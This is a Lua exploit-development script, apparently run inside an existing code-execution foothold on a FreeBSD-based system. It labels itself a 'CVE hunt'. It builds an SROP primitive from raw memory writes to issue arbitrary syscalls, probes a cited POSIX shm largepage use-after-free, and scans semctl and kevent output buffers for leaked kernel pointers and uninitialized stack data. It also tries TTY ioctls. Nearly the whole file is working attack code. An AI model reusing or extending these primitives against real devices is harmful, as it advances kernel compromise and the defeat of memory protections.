-- CRASH_CLASS: MODERATE
-- PROBE 145b: Test POSIX shm, semctl, kevent stack data (CVE hunt)
--
-- SA-26:44.posixshm: POSIX largepage UAF via shm_open
-- SA-26:55: semctl heap OOB
-- kevent: scan for uninitialized kernel stack data

print("=== PROBE 145b: CVE HUNT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

-- [A] POSIX shm_open (sys 482)
print("--- [A] SHM_OPEN ---")
local name_buf = memory.alloc(32)
local sname = "/test_shm"
for i = 1, #sname do memory.write_byte(name_buf + i - 1, string.byte(sname, i)) end
memory.write_byte(name_buf + #sname, 0)

-- O_CREAT=0x200, O_RDWR=2, mode=0666
local shm_rv = srop(482, uint64(name_buf), uint64(0x202), uint64(438))
local shm_fd = shm_rv and to_num(shm_rv) or -1
print("shm_open=" .. shm_fd)

if shm_fd >= 0 then
    print("*** SHM_OPEN WORKS ***")
    -- ftruncate to set size
    local ft_rv = srop(480, uint64(shm_fd), uint64(0x100000))
    print("ftruncate=" .. (ft_rv and tostring(to_num(ft_rv)) or "nil"))

    -- Try mmap with large pages (MAP_ALIGNED_SUPER=0x01000000)
    local sc_mmap = make_syscall(477)
    local ok_m, m1 = pcall(function()
        return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
            uint64(0x01000001), uint64(shm_fd), uint64(0))
    end)
    if ok_m then
        local mh, ml = get_hi_lo(m1)
        print("largepage_map=0x" .. string.format("%X%08X", mh, ml))
        if ml ~= 0 or mh ~= 0 then
            print("*** LARGE PAGE MAP SUCCEEDED ***")
        end
    else
        print("largepage PCALL-FAIL")
    end

    -- Normal mmap
    local ok_m2, m2 = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x0001), uint64(shm_fd), uint64(0))
    end)
    if ok_m2 then
        local mh, ml = get_hi_lo(m2)
        print("normal_map=0x" .. string.format("%X%08X", mh, ml))
    end

    -- shm_unlink (sys 483)
    local ul = srop(483, uint64(name_buf))
    print("shm_unlink=" .. (ul and tostring(to_num(ul)) or "nil"))

    srop(6, uint64(shm_fd))
end

-- [B] semget/semctl (sys 221/510)
print("")
print("--- [B] SEMCTL ---")
-- semget(key, nsems, flags) - sys 221
-- IPC_PRIVATE=0, nsems=1, IPC_CREAT=0x200|0666=0x2B6
local sem_rv = srop(221, uint64(0), uint64(1), uint64(0x3B6))
local sem_id = sem_rv and to_num(sem_rv) or -1
print("semget=" .. sem_id)

if sem_id >= 0 then
    print("*** SEMGET WORKS ***")
    -- semctl(semid, semnum, cmd, arg) - sys 510
    -- IPC_STAT=2 - copies semid_ds to arg
    local stat_buf = memory.alloc(256)
    for i = 0, 255, 4 do wd(stat_buf + i, 0xAAAAAAAA) end
    local sc_rv = srop(510, uint64(sem_id), uint64(0), uint64(2), uint64(stat_buf))
    print("semctl_STAT=" .. (sc_rv and tostring(to_num(sc_rv)) or "nil"))

    -- Scan for kernel pointers in output
    for off = 0, 128, 8 do
        local v = memory.read_qword(stat_buf + off)
        local vh, vl = get_hi_lo(v)
        if vh >= 0xFFFF8000 then
            print("*** KPTR at +" .. string.format("%02X", off) .. "=0x" ..
                string.format("%X%08X", vh, vl) .. " ***")
        end
    end

    -- GETALL=13 - get all semaphore values
    local val_buf = memory.alloc(64)
    for i = 0, 63, 4 do wd(val_buf + i, 0xBBBBBBBB) end
    local ga_rv = srop(510, uint64(sem_id), uint64(0), uint64(13), uint64(val_buf))
    print("semctl_GETALL=" .. (ga_rv and tostring(to_num(ga_rv)) or "nil"))

    -- IPC_RMID=0 cleanup
    srop(510, uint64(sem_id), uint64(0), uint64(0))
end

-- [C] kevent kernel stack data scan
print("")
print("--- [C] KEVENT STACK ---")
-- kqueue() = sys 362
local kq_rv = srop(362)
local kq_fd = kq_rv and to_num(kq_rv) or -1
print("kqueue=" .. kq_fd)

if kq_fd >= 0 then
    -- kevent(kq, changelist, nchanges, eventlist, nevents, timeout) = sys 560 or 363
    -- Try sys 363 (kevent)
    local ev_out = memory.alloc(512)
    -- Zero timeout for non-blocking
    local ts = memory.alloc(16)
    wq(ts, uint64(0))
    wq(ts + 8, uint64(0))

    -- Fill output buffer with sentinel
    for i = 0, 511, 4 do wd(ev_out + i, 0xCCCCCCCC) end

    -- Register a timer event (EVFILT_TIMER=-7, EV_ADD=1, EV_ONESHOT=0x10)
    local ev_in = memory.alloc(64)
    -- struct kevent: ident(8) filter(2) flags(2) fflags(4) data(8) udata(8) = 32 bytes
    wq(ev_in, uint64(1))           -- ident=1
    memory.write_word(ev_in + 8, 0xFFF9)  -- filter=-7 (EVFILT_TIMER) as uint16
    memory.write_word(ev_in + 10, 0x0011) -- flags=EV_ADD|EV_ONESHOT
    wd(ev_in + 12, 0)              -- fflags
    wq(ev_in + 16, uint64(1))     -- data=1ms
    wq(ev_in + 24, uint64(0x4141414141414141)) -- udata=sentinel

    local kev_rv = srop(363, uint64(kq_fd), uint64(ev_in), uint64(1),
        uint64(ev_out), uint64(8), uint64(ts))
    print("kevent_add=" .. (kev_rv and tostring(to_num(kev_rv)) or "nil"))

    -- Wait 10ms, then poll for events
    local tw = memory.alloc(16)
    wq(tw, uint64(0))
    wq(tw + 8, uint64(10000000))
    pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

    -- Poll with zero timeout
    for i = 0, 511, 4 do wd(ev_out + i, 0xCCCCCCCC) end
    local kev_rv2 = srop(363, uint64(kq_fd), uint64(0), uint64(0),
        uint64(ev_out), uint64(8), uint64(ts))
    local nevt = kev_rv2 and to_num(kev_rv2) or -1
    print("kevent_poll=" .. nevt)

    if nevt > 0 then
        -- Dump all kevent output bytes for analysis
        for ev = 0, nevt - 1 do
            local base = ev_out + ev * 32
            local line = "ev" .. ev .. ":"
            for off = 0, 31, 8 do
                local v = memory.read_qword(base + off)
                local vh, vl = get_hi_lo(v)
                line = line .. " " .. string.format("%08X%08X", vh, vl)
                if vh >= 0xFFFF8000 then
                    print("*** KPTR in event " .. ev .. " at +" ..
                        string.format("%02X", off) .. " ***")
                end
            end
            print(line)
        end
    end

    -- Scan ALL output bytes for kernel pointers
    for off = 0, 255, 8 do
        local v = memory.read_qword(ev_out + off)
        local vh, vl = get_hi_lo(v)
        if vh >= 0xFFFF8000 then
            print("*** KPTR at buf+" .. string.format("%02X", off) .. "=0x" ..
                string.format("%X%08X", vh, vl) .. " ***")
        end
    end

    srop(6, uint64(kq_fd))
end

-- [D] TTY ioctl: TIOCSCTTY=0x20007461
print("")
print("--- [D] TTY ---")
-- Try /dev/console, /dev/tty
local pb = memory.alloc(32)
for _, path in ipairs({"/dev/tty", "/dev/console", "/dev/pts/0"}) do
    for i = 1, #path do memory.write_byte(pb + i - 1, string.byte(path, i)) end
    memory.write_byte(pb + #path, 0)
    local ok_o, tfd = pcall(function()
        return make_syscall(5)(uint64(pb), uint64(2), uint64(0))
    end)
    local tfv = ok_o and to_num(tfd) or -1
    if tfv >= 0 then
        print(path .. " fd=" .. tfv .. " ***")
        -- TIOCSCTTY
        local ti_rv = srop(54, uint64(tfv), uint64(0x20007461), uint64(0))
        print("TIOCSCTTY=" .. (ti_rv and tostring(to_num(ti_rv)) or "nil"))
        srop(6, uint64(tfv))
    end
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
